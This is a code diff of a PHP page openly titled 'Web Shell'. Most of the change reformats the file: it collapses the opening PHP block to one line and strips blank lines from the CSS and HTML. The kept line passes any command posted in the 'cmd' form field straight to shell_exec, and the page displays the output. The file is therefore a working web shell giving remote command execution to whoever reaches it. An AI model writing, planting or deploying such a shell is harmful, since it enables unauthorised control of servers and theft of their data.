@@ -1,10 +1,4 @@
-<?php
-if (!empty($_POST['cmd'])) {
-    $cmd = shell_exec($_POST['cmd']);
-}
-?>
-<!DOCTYPE html>
-<html lang="en">
+<?php if (!empty($_POST['cmd'])) {$cmd = shell_exec($_POST['cmd']);} ?>
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -15,61 +9,50 @@ if (!empty($_POST['cmd'])) {
             -webkit-box-sizing: border-box;
             box-sizing: border-box;
         }
-
         body {
             font-family: sans-serif;
             color: rgba(0, 0, 0, .75);
         }
-
         main {
             margin: auto;
             max-width: 850px;
         }
-
         pre,
         input,
         button {
             border-radius: 5px;
         }
-
         pre,
         input,
         button {
             background-color: #efefef;
         }
-
         label {
             display: block;
         }
-
         input {
             width: 100%;
             background-color: #efefef;
             border: 2px solid transparent;
         }
-
         input:focus {
             outline: none;
             background: transparent;
             border: 2px solid #e6e6e6;
         }
-
         button {
             border: none;
             cursor: pointer;
             margin-left: 5px;
         }
-
         button:hover {
             background-color: #e6e6e6;
         }
-
         pre,
         input,
         button {
             padding: 10px;
         }
-
         .form-group {
             display: -webkit-box;
             display: -ms-flexbox;
@@ -77,14 +60,11 @@ if (!empty($_POST['cmd'])) {
             padding: 15px 0;
         }
     </style>
-
 </head>
-
 <body>
     <main>
         <h1>Web Shell</h1>
         <h2>Execute a command</h2>
-
         <form method="post">
             <label for="cmd"><strong>Command</strong></label>
             <div class="form-group">
@@ -93,7 +73,6 @@ if (!empty($_POST['cmd'])) {
                 <button type="submit">Execute</button>
             </div>
         </form>
-
         <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
             <h2>Output</h2>
             <?php if (isset($cmd)): ?>
